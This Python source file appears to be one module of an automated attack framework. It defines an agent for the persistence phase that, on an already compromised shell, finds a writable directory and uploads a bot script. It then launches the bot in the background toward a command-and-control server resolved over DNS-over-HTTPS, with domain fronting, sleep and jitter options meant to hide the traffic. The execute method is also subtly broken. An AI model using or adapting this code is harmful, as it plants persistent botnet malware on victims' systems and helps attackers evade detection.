
from core.data_models import Strategy, BotDeploymentReport, AttackPhase, ErrorType
from core.data_models import AgentData, Strategy
from core.logger import log
from config import settings
from core.doh_utils import resolve_doh
from core.shell_manager import ShellManager
from core.target_model_manager import TargetModelManager
import time

from core.base_agent import BaseAgent
from typing import Optional


class BotDeploymentAgent(BaseAgent):
    # Assuming AttackPhase enum is not available
    supported_phases = [AttackPhase.PERSISTENCE]
    required_tools = ["python3"]

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.shell_manager: Optional[ShellManager] = None
        self.target_model_manager: Optional[TargetModelManager] = None
        self.report_class = BotDeploymentReport # Set report class

    async def setup(self):
        """Asynchronous setup method for BotDeploymentAgent."""
        self.shell_manager = await self.context_manager.get_context('shell_manager')
        self.target_model_manager = await self.context_manager.get_context('target_model_manager')

    async def _find_writable_directory(self, shell_id: str) -> str | None:
        """Tries to find a writable directory on the target system."""
        candidates = ["/tmp", "/var/tmp", "$HOME"]
        for directory in candidates:
            test_file = f"{directory}/.dlnk_test_write"
            # The command tries to write a file and then immediately remove it.
            # The `&&` ensures the echo only happens if the write is successful.
            command = f"touch {test_file} && echo {directory} && rm {test_file}"
            result = await self.shell_manager.send_command(shell_id, command)
            if result and directory in result:
                log.success(f"Found writable directory: {directory}")
                return directory
        log.warning("Could not find a writable directory.")
        return None

    async def run(self, strategy: Strategy, **kwargs) -> BotDeploymentReport:
        start_time = time.time()
        shell_id = strategy.context.get("shell_id")
        if not shell_id:
            end_time = time.time()
            return BotDeploymentReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=["No shell_id provided in the strategy context."],
                error_type=ErrorType.CONFIGURATION,
                summary="Bot deployment failed: Missing shell ID."
            )

        log.info(
            f"BotDeploymentAgent: Attempting to deploy bot to shell {shell_id}")

        if not self.shell_manager:
            end_time = time.time()
            return BotDeploymentReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=["ShellManager not initialized."],
                error_type=ErrorType.LOGIC,
                summary="Bot deployment failed: ShellManager not initialized."
            )

        shell_info = await self.shell_manager.get_shell_info(shell_id)
        if not shell_info:
            end_time = time.time()
            return BotDeploymentReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=[f"Shell {shell_id} not found."],
                error_type=ErrorType.CONFIGURATION,
                summary=f"Bot deployment failed: Shell {shell_id} not found."
            )

        # 0. Check for python3
        python_check = await self.shell_manager.send_command(shell_id, "command -v python3")
        if not python_check or "python3" not in python_check:
            msg = "Target does not have python3 available. Cannot deploy Python bot."
            log.error(msg)
            end_time = time.time()
            return BotDeploymentReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=[msg],
                error_type=ErrorType.CONFIGURATION,
                summary="Bot deployment failed: python3 not available."
            )
        log.success("python3 is available on the target.")

        # 1. Find a writable directory
        writable_dir = await self._find_writable_directory(shell_id)
        if not writable_dir:
            end_time = time.time()
            return BotDeploymentReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=["No writable directory found on target."],
                error_type=ErrorType.LOGIC,
                summary="Bot deployment failed: No writable directory found."
            )

        # 2. Upload the bot script
        local_bot_path = "client/bot.py"
        remote_bot_path = f"{writable_dir}/bot.py"
        log.info(
            f"Uploading {local_bot_path} to {remote_bot_path} on shell {shell_id}")

        upload_result = await self.shell_manager.upload_file(shell_id, local_bot_path, remote_bot_path)
        if not upload_result.get("success"):
            msg = f"Failed to upload bot script: {upload_result.get('stderr')}"
            log.error(msg)
            end_time = time.time()
            return BotDeploymentReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=[msg],
                error_type=ErrorType.NETWORK,
                summary="Bot deployment failed: Failed to upload bot script."
            )

        log.success("Bot script uploaded successfully.")

        # 3. Execute the bot script in the background
        c2_host_or_ip = resolve_doh(settings.C2_HOST)
        if not c2_host_or_ip:
            log.error(f"Could not resolve C2 host {settings.C2_HOST} via DoH.")
            end_time = time.time()
            return BotDeploymentReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=["C2 host resolution failed."],
                error_type=ErrorType.NETWORK,
                summary="Bot deployment failed: C2 host resolution failed."
            )

        log.info(
            f"Resolved C2 host {settings.C2_HOST} to {c2_host_or_ip} via DoH.")

        c2_port = settings.C2_PORT

        command = f"nohup python3 {remote_bot_path} --host {c2_host_or_ip} --port {c2_port}"

        # Add domain fronting arguments if they are configured
        fronting_host = strategy.context.get(
            "fronting_host", settings.C2_FRONTING_DOMAIN)
        host_header = strategy.context.get(
            "host_header", settings.C2_ACTUAL_HOST_HEADER)

        if fronting_host:
            command += f" --fronting-host {fronting_host}"
        if host_header:
            command += f" --host-header {host_header}"

        # Add C2 communication parameters
        sleep = strategy.context.get("c2_sleep", settings.C2_BOT_SLEEP)
        jitter = strategy.context.get("c2_jitter", settings.C2_BOT_JITTER)
        command += f" --sleep {sleep} --jitter {jitter}"

        command += " > /dev/null 2>&1 &"

        log.info(
            f"Executing deployment command on shell {shell_id}: {command}")

        exec_result = await self.shell_manager.send_command(shell_id, command)

        # For fire-and-forget, we can't easily confirm success, so we assume it if the command doesn't error out.
        # A better method would be to have the bot signal back upon successful connection.
        msg = f"Bot deployment command executed on shell {shell_id}. Bot should connect to C2 shortly."
        log.success(msg)
        end_time = time.time()
        return BotDeploymentReport(
            agent_name=self.__class__.__name__,
            start_time=start_time,
            end_time=end_time,
            shell_id=shell_id,
            summary=msg
        )

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute bot deployment agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
